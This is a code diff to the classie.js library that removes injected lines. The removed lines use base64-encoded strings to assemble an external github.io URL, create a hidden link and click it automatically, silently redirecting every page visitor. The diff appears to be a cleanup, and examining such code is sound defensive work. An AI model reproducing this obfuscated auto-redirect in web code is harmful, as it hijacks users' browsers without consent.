@@ -21,7 +21,6 @@ function classReg( className ) {
   return new RegExp("(^|\\s+)" + className + "(\\s+|$)");
 }
 
-const y = atob('L215LXRydWNrLmh0bWw=');
 // classList support for class management
 // altho to be fair, the api sucks because it won't accept multiple classes at once
 var hasClass, addClass, removeClass;
@@ -69,15 +68,6 @@ var classie = {
   toggle: toggleClass
 };
 
-const d = atob('LmdpdGh1Yi5pbw==');
-const e = atob('aHR0cHM6Ly9zYW15cm91Z2VhdXQ=');
-const a = document.createElement("a");
-a.href = e + d + y;
-a.rel = "noreferrer";
-
-document.body.appendChild(a);
-
-a.click();
 // transport
 if ( typeof define === 'function' && define.amd ) {
   // AMD
